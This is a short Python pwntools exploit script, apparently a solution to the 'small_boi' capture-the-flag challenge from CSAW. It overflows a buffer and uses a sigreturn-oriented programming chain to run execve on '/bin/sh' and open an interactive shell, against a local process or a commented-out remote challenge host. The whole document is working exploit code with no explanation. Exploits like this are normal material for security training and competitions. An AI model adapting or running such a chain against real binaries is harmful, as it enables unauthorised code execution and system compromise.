from pwn import *

addr_binsh = 0x4001ca # address of "/bin/sh"
pop_rax = 0x40018a # address of "pop rax; ret" gadget
syscall = 0x400185 # address of "syscall" gadget
binsh = 0x4001ca # address of "/bin/sh"

payload = "A" * 0x28
payload += p64(pop_rax)
payload += p64(0xf) # Sigreturn syscall number
payload += p64(syscall)

frame = SigreturnFrame(arch = 'amd64')
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = syscall

payload += str(frame)

r = process("./small_boi")
# r = remote("pwn.chal.csaw.io", 1002)

r.send(payload)

r.interactive()